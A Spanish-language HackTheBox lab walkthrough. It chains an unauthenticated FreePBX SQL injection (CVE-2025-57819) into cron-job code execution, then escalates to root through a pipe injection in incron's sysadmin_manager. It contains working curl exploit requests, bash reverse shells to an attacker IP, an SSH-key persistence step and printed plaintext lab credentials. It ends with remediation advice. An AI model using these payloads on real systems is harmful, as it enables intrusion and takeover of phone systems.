# Connected — HackTheBox Writeup

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black" alt="HackTheBox">
  <img src="https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux">
  <img src="https://img.shields.io/badge/Difficulty-Medium-E6B800?style=for-the-badge" alt="Medium">
  <img src="https://img.shields.io/badge/Status-Owned-brightgreen?style=for-the-badge" alt="Owned">
</p>

> Compromiso completo de `connected.htb` (FreePBX 16.0.40.7 sobre Sangoma Linux 7) encadenando una **SQLi no autenticada (CVE-2025-57819)** → `INSERT` en la tabla `cron_jobs` para RCE como `asterisk` → **pipe injection** en `sysadmin_manager` vía **incron** para escalar a `root`.

---

## 📑 Tabla de contenidos

- [Ficha técnica](#-ficha-técnica)
- [Cadena de ataque](#-cadena-de-ataque)
- [1. Reconocimiento](#1-reconocimiento)
- [2. Enumeración de servicios](#2-enumeración-de-servicios)
- [3. Investigación de vulnerabilidades — CVE-2025-57819](#3-investigación-de-vulnerabilidades--cve-2025-57819)
- [4. Explotación — acceso inicial (SQLi → reverse shell)](#4-explotación--acceso-inicial-sqli--reverse-shell)
- [5. Post-explotación y enumeración](#5-post-explotación-y-enumeración)
- [6. Escalada a root — pipe injection vía incron](#6-escalada-a-root--pipe-injection-vía-incron)
- [Resumen de vulnerabilidades](#-resumen-de-vulnerabilidades)
- [Recomendaciones de remediación](#-recomendaciones-de-remediación)

---

## 🎯 Ficha técnica

| Campo | Valor |
|---|---|
| **Máquina** | `connected.htb` |
| **IP** | `10.129.16.80` |
| **Sistema operativo** | Sangoma Linux 7 (CentOS 7) |
| **Kernel** | `5.4.239-1.el7.elrepo.x86_64` |
| **Aplicación** | FreePBX 16.0.40.7 (Apache 2.4.6 + PHP 7.4.16) |
| **Base de datos** | MariaDB 5.5.65 |
| **Dificultad** | Media |
| **CVE principal** | CVE-2025-57819 (SQLi no autenticada) |
| **Foothold** | `asterisk` (uid 999) |
| **Escalada** | `root` — pipe injection vía incron |
| **Fecha** | 2026-06-08 |

---

## 🗺️ Cadena de ataque

```mermaid
flowchart TD
    A[Reconocimiento<br/>Nmap: 22, 80, 443] --> B[FreePBX 16.0.40.7<br/>panel de administración]
    B --> C[CVE-2025-57819<br/>SQLi no auth en parámetro brand]
    C --> D[Stacked query<br/>INSERT INTO cron_jobs]
    D --> E[Cron ejecuta el comando<br/>reverse shell]
    E --> F[Shell como asterisk<br/>uid 999]
    F --> G[LinPEAS<br/>incron corre como root]
    G --> H[sysadmin_manager<br/>filtro no bloquea el pipe '|']
    H --> I[Mecanismo .CONTENTS<br/>params desde el archivo]
    I --> J[Pipe injection<br/>system ejecuta como root]
    J --> K[Shell como root → root.txt]

    style C fill:#ff6b6b,stroke:#c92a2a,color:#000
    style K fill:#51cf66,stroke:#2b8a3e,color:#000
```

| # | Fase | Técnica | Resultado |
|---|---|---|---|
| 1 | Reconocimiento | Nmap | Puertos 22, 80, 443 → FreePBX |
| 2 | Enumeración | curl + navegador | FreePBX 16.0.40.7 |
| 3 | Investigación | CVE lookup | CVE-2025-57819 (CVSS 9.8) |
| 4 | Explotación | SQLi → `cron_jobs` | Shell como `asterisk` |
| 5 | Post-explotación | LinPEAS | incron como root |
| 6 | Escalada | Pipe injection vía `.CONTENTS` | Root shell |

---

## 1. Reconocimiento

### 1.1 Escaneo de todos los puertos

```bash
nmap -p- --min-rate=1000 -T4 10.129.16.80
# -p-          todos los 65535 puertos TCP
# --min-rate   al menos 1000 paquetes/seg
# -T4          velocidad agresiva pero estable
```

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

### 1.2 Detección de versiones

```bash
nmap -sC -sV -p 22,80,443 10.129.16.80
```

```text
22/tcp  open  ssh       OpenSSH 7.4
80/tcp  open  http      Apache/2.4.6 (CentOS) PHP/7.4.16
                        Redirect -> http://connected.htb/
443/tcp open  ssl/https Apache/2.4.6 (CentOS)
                        SSL cert CN=pbxconnect
```

### 1.3 Análisis

- **CentOS** (por el header de Apache).
- **Virtual Hosting** → redirige a `connected.htb`, hay que agregarlo a `/etc/hosts`.
- **`CN=pbxconnect`** → sugiere un sistema PBX (centralita VoIP).
- **PHP 7.4.16** → la app web es PHP.

```bash
echo "10.129.16.80  connected.htb pbxconnect.connected.htb" | sudo tee -a /etc/hosts
```

---

## 2. Enumeración de servicios

Al entrar a `http://connected.htb/` aparece la página de FreePBX con *FreePBX Administration*, *User Control Panel*, *Operator Panel* y *Get Support*.

```bash
curl -I -L http://connected.htb/
# HTTP/1.1 302 Found -> /admin
# HTTP/1.1 302 Found -> config.php
# HTTP/1.1 200 OK
# Server: Apache/2.4.6 (CentOS) PHP/7.4.16
```

En el pie del panel de administración se lee la versión exacta: **FreePBX 16.0.40.7**.

> **FreePBX** es un sistema de telefonía IP (VoIP) de código abierto. Si se compromete, un atacante puede interceptar llamadas, hacer llamadas fraudulentas, o usarlo como punto de entrada a la red interna.

---

## 3. Investigación de vulnerabilidades — CVE-2025-57819

| Campo | Detalle |
|---|---|
| **CVE ID** | CVE-2025-57819 |
| **CVSS** | 9.8 / 10 (Crítico) |
| **Tipo** | Inyección SQL no autenticada |
| **Componente** | Módulo Endpoint — handler AJAX |
| **Parámetro** | `brand` |
| **Versiones afectadas** | FreePBX `<= 15.0.65`, `<= 16.0.88`, `<= 17.0.2` |
| **Versión parcheada** | `>= 16.0.89` |
| **Requiere auth** | **No** |
| **Exploit público** | Sí (WatchTowr Labs, Horizon3.ai) |

La vulnerabilidad tiene **tres componentes encadenados**:

1. **Bypass de autenticación** — la ruta `FreePBX\modules\endpoint\ajax` evita el chequeo de auth del handler AJAX.
2. **Inyección SQL** — el parámetro `brand` se concatena sin sanitizar → inyección error-based (`EXTRACTVALUE`) y **stacked queries**.
3. **Ejecución de código** — FreePBX usa la tabla `cron_jobs` para programar tareas; al insertar una fila con un comando malicioso, FreePBX lo ejecuta cada minuto.

---

## 4. Explotación — acceso inicial (SQLi → reverse shell)

### 4.1 Confirmación (error-based SQLi)

```bash
curl -s -G "http://connected.htb/admin/ajax.php" \
  --data-urlencode 'module=FreePBX\modules\endpoint\ajax' \
  --data-urlencode 'command=model' \
  --data-urlencode 'template=x' \
  --data-urlencode 'model=model' \
  --data-urlencode "brand=x' AND extractvalue(1,concat(0x7e,version()))-- -"
```

```json
{"error":{"message":"SQLSTATE[HY000]: General error:
  1105 XPATH syntax error: '~5.5.65-MariaDB'"}}
```

La versión de la DB (`MariaDB 5.5.65`) aparece en el error XPATH → **inyección confirmada**.

> `0x7e` es el `~` en hex; se usa como separador para que la versión se vea clara en el error (`~5.5.65-MariaDB`).

### 4.2 Reverse shell vía `cron_jobs`

**Listener en Kali:**

```bash
nc -lvnp 4444
```

**Codificar el payload en base64** (evita romper la query con caracteres especiales):

```bash
echo -n 'bash -i >& /dev/tcp/10.10.17.159/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNTkvNDQ0NCAwPiYx
```

**Inyectar el cron job malicioso (stacked query):**

```bash
curl -s -G "http://connected.htb/admin/ajax.php" \
  --data-urlencode 'module=FreePBX\modules\endpoint\ajax' \
  --data-urlencode 'command=model' \
  --data-urlencode 'template=x' \
  --data-urlencode 'model=model' \
  --data-urlencode "brand=x' ;INSERT INTO cron_jobs
    (modulename,jobname,command,class,schedule,
     max_runtime,enabled,execution_order) VALUES
    ('sysadmin','revshell',
     'echo YmFzaC...base64...|base64 -d|bash',
     NULL,'* * * * *',30,1,1)-- -"
```

En menos de 60 segundos el cron procesa la tabla y dispara el shell:

```text
connect to [10.10.17.159] from (UNKNOWN) [10.129.16.80] 38492
[asterisk@connected ~]$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

🚩 **Foothold como `asterisk` (uid 999).**

```bash
cat /home/asterisk/user.txt   # o ubicación de la flag de usuario
# user.txt → [REDACTED]
```

---

## 5. Post-explotación y enumeración

### 5.1 Estabilizar el acceso vía SSH

```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'ssh-rsa AAAA...nuestra_llave...' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
# Desde Kali:
ssh asterisk@connected.htb
```

### 5.2 Información recopilada

| Dato | Valor | Relevancia |
|---|---|---|
| Usuario | `asterisk` (uid 999) | Usuario del servicio FreePBX |
| Kernel | `5.4.239-1.el7` | No vulnerable a DirtyPipe/DirtyCow |
| pkexec | `0.112-26.el7_9.1` (parcheado) | PwnKit NO funciona |
| `AMPDBPASS` | `mZzDpAGKTmPJ` | Password de MariaDB en texto plano |
| `AMPMGRPASS` | `fe1mYBs7D5P3` | Password del Asterisk Manager |
| Servicio root:4000 | `aiovega` (aiohttp) | App como root en localhost |
| `incrond` | PID 750, **root** | Demonio cron basado en inotify |

### 5.3 LinPEAS → el hallazgo clave

```bash
scp linpeas.sh asterisk@connected.htb:/tmp/
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

> LinPEAS reveló entradas de **incrontab** que ejecutan comandos **como root** cuando se escriben archivos en directorios controlados por `asterisk`. Ese es el vector a root.

---

## 6. Escalada a root — pipe injection vía incron

### 6.1 incron como vector

`incron` es un demonio que vigila cambios en archivos/carpetas y ejecuta un comando al detectarlos. Aquí `incrond` corre como **root**:

```bash
# /etc/incron.d/sysadmin
/var/spool/asterisk/incron  IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#
# Al ESCRIBIR un archivo en /var/spool/asterisk/incron/
# ROOT ejecuta: /usr/bin/sysadmin_manager <nombre_del_archivo>
```

Y el directorio vigilado es **nuestro** (propiedad de `asterisk`):

```bash
ls -la /var/spool/asterisk/incron/
# drwxrwxr-x. 2 asterisk asterisk 6 Nov 30 2025 .
```

### 6.2 `sysadmin_manager` y sus capas de seguridad

`sysadmin_manager` es un script PHP que ejecuta hooks del módulo sysadmin con varias defensas:

| Capa | Descripción | Estado |
|---|---|---|
| Hash de `includes.php` | Integridad del archivo de dependencias | Activa |
| Firma GPG | Módulo firmado por Sangoma | Activa |
| Hash del hook | SHA256 del hook vs registrado | Activa |
| Validación de params | Bloquea `` ` ' " $ > < & ; `` | **Activa pero incompleta** |

### 6.3 El bypass: pipe injection

```php
// Filtro de caracteres peligrosos:
if (preg_match('/[`\'"$><&;]/', $params)) {
    exit;   // bloquea estos caracteres
}
// PERO '|' (pipe) NO está en la lista.
// Y la ejecución final es:
system("$hookfile $params");
```

El `|` redirige la salida de un comando como entrada de otro — al no estar filtrado, inyectamos un segundo comando que se ejecuta como root.

### 6.4 Mecanismo `.CONTENTS`

```php
// Si el nombre del archivo termina en .CONTENTS,
// lee el CONTENIDO del archivo como parámetros:
if ($parts[3] === "CONTENTS") {
    $params = fread($fh, 4096);
}
```

Esto permite pasar params complejos (el pipe injection) por el **contenido** del archivo en vez del nombre.

### 6.5 Ejecución del exploit

```bash
# Paso 1 — script que root ejecutará
echo '#!/bin/bash' > /tmp/exploit.sh
echo 'bash -i >& /dev/tcp/10.10.17.159/9001 0>&1' >> /tmp/exploit.sh
chmod +x /tmp/exploit.sh

# Paso 2 — listener en Kali (otra terminal)
nc -lvnp 9001

# Paso 3 — disparar vía .CONTENTS
printf '| /tmp/exploit.sh' > /var/spool/asterisk/incron/sysadmin.restart-apache.CONTENTS
```

> **¿Por qué `printf` y no `echo`?** `echo` añade un `\n` (0x0a) al final, que está **fuera** del rango permitido por el filtro (0x20–0x7e) y haría que el contenido se rechazara en silencio. `printf` no añade el salto de línea.

### 6.6 Flujo interno

1. Creamos `sysadmin.restart-apache.CONTENTS` en `/var/spool/asterisk/incron/`.
2. `incrond` (root) detecta `IN_CLOSE_WRITE` → ejecuta `sysadmin_manager sysadmin.restart-apache.CONTENTS`.
3. Parsea: `module=sysadmin`, `hook=restart-apache`, `params=CONTENTS`.
4. Como params es `CONTENTS`, lee el archivo: `| /tmp/exploit.sh`.
5. Verifica GPG del módulo → **pasa** (original firmado).
6. Verifica SHA256 del hook → **pasa** (no lo modificamos).
7. Valida params `| /tmp/exploit.sh` → **pasa** (`|` no está en el filtro).
8. Ejecuta como **root**: `system("hooks/restart-apache | /tmp/exploit.sh")`.
9. Recibimos shell como root.

```text
[root@connected /]# id
uid=0(root) gid=0(root) groups=0(root)
```

🚩 **Root shell obtenida. Sistema completamente comprometido.**

```bash
cat /root/root.txt
# root.txt → [REDACTED]
```

---

## 🔎 Resumen de vulnerabilidades

| # | Vulnerabilidad | Severidad | Impacto |
|---|---|---|---|
| 1 | CVE-2025-57819 — SQLi no autenticada en FreePBX | **Crítica (9.8)** | Acceso inicial como `asterisk` |
| 2 | Pipe injection en `sysadmin_manager` vía incron | **Alta** | Escalada a root |
| 3 | Credenciales en texto plano en archivos de config | Media | Acceso a DB, movimiento lateral |
| 4 | pkexec SUID (parcheado) | Informativa | No explotable en esta versión |

---

## 🛡️ Recomendaciones de remediación

| # | Acción | Prioridad |
|---|---|---|
| 1 | Actualizar el módulo endpoint de FreePBX a `>= 16.0.89` (`fwconsole ma upgrade endpoint`) | **Crítica** |
| 2 | Añadir `\|` al filtro de caracteres de `sysadmin_manager` | **Alta** |
| 3 | Restringir permisos en `/var/spool/asterisk/incron/` | **Alta** |
| 4 | Cifrar las contraseñas en `freepbx.conf` y `amportal.conf` | Media |
| 5 | Mínimo privilegio en las entradas de incron (no ejecutar como root) | Media |
| 6 | Restricción de IP para `/admin/` (firewall o `.htaccess`); el panel no debe exponerse a internet | Media |

**Corrección concreta del filtro:**

```php
// ANTES (vulnerable):
if (preg_match('/[`\'"$><&;]/', $params))
// DESPUÉS (corregido):
if (preg_match('/[`\'"$><&;|]/', $params))
```

---

<p align="center">
  <sub>Escrito con fines <b>educativos</b>. Máquina resuelta en el laboratorio legal y controlado de HackTheBox.</sub>
</p>